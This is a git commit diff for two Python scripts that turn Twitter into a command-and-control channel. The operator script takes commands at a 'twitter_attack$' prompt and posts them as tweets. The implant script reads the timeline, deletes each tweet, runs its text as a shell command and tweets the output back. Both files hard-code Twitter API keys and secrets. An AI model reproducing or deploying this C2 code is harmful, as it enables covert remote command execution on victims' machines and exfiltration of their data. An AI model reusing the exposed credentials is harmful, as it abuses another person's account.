3ddf2a80206e85bfb8fea08f0b465f478c3e0091
lmbradford115 <lm.bradford115@gmail.com>
2016-02-07 16:15:18 -0500

    channel works but not yet continuous

--- twitterPost.py
+++ twitterPost.py
@@ -1,8 +1,8 @@
 import tweepy
-from newEncrypt import *
-#import sys  
-#reload(sys)  
-#sys.setdefaultencoding('utf-8')
+#from newEncrypt import *
+#import os 
+import time
+
 
 consumer_key = 'zLZ2NN1qemQChgVOae3QlgNtp'
 consumer_secret = 'hbAZzMFdpff1sDHp50d4qt4l7QumyUfhxSybl5Smne1eTi2mEw'
@@ -11,13 +11,49 @@ access_token_secret = 'h2BMjDxt24XolArqy2vuRJYauMqKp2boNIgWUdHwlmGxD'
 
 auth = tweepy.OAuthHandler(consumer_key, consumer_secret)
 auth.set_access_token(access_token, access_token_secret )
-
 api = tweepy.API(auth)
 
-var = raw_input("Please enter a command: ") 
-msg = encode(var)
-#print msg
-#print "Command entered: " + var  
-#str = unicode(msg, errors='replace')
-api.update_status(msg)
-#api.update_status(msg.encode('ascii'))
+
+############################
+#API_KEY = "zLZ2NN1qemQChgVOae3QlgNtp"
+#API_SECRET = "hbAZzMFdpff1sDHp50d4qt4l7QumyUfhxSybl5Smne1eTi2mEw" 
+#auth = tweepy.AppAuthHandler(API_KEY, API_SECRET)
+ 
+#api = tweepy.API(auth, wait_on_rate_limit=True,
+				   #wait_on_rate_limit_notify=True)
+#if (not api):
+    #print ("Can't Authenticate")
+   # sys.exit(-1)
+				   
+				   
+
+while True:
+	var = raw_input("twitter_attack$ ")
+	if var == "exit":
+		break
+	else: 
+		#msg = encode(var) 
+		api.update_status(var)
+		#get and print implant response, might need timing feature
+		time.sleep(15)
+		new_public_tweets = api.home_timeline()
+		count = 0
+		
+		while count < 1:
+			for tweet in new_public_tweets:
+				test = str(tweet.text)
+				#bytes = str.encode(test)
+				#type(bytes)	
+				#mess = decode(bytes)
+				print test
+				count = count + 1
+	
+	#delete all posts		
+	#for tweet in new_public_tweets:
+		#api.destroy_status(tweet.id)
+			
+	
+			
+		
+		
+	
--- twitterRead.py
+++ twitterRead.py
@@ -1,8 +1,8 @@
 import tweepy
-from newEncrypt import *
-#import sys  
-#reload(sys)  
-#sys.setdefaultencoding('utf-8')
+#from newEncrypt import *
+import subprocess
+import os
+
 
 consumer_key = 'zLZ2NN1qemQChgVOae3QlgNtp'
 consumer_secret = 'hbAZzMFdpff1sDHp50d4qt4l7QumyUfhxSybl5Smne1eTi2mEw'
@@ -11,14 +11,26 @@ access_token_secret = 'h2BMjDxt24XolArqy2vuRJYauMqKp2boNIgWUdHwlmGxD'
 
 auth = tweepy.OAuthHandler(consumer_key, consumer_secret)
 auth.set_access_token(access_token, access_token_secret )
-
 api = tweepy.API(auth)
 
+#while True:
 public_tweets = api.home_timeline()
+#new_tweets = api.search(q='PhoenixKrazyKat', count=10)
+#print new_tweets
+
+count = 0
 for tweet in public_tweets:
 	test = str(tweet.text)
-	bytes = str.encode(test)
-	type(bytes)	
-	print "Decoded message: " + decode(bytes)
-	#api.destroy_status(tweet.id)
-   		
+	api.destroy_status(tweet.id)
+	#bytes = str.encode(test)
+	#type(bytes)	
+	#mess = decode(bytes)
+	response = subprocess.check_output(test, shell=True)
+	#enResponse = encode(response) 
+	api.update_status(response)
+	
+	#count = count + 1
+
+	
+	#print "Decoded message: " + mess
+	#
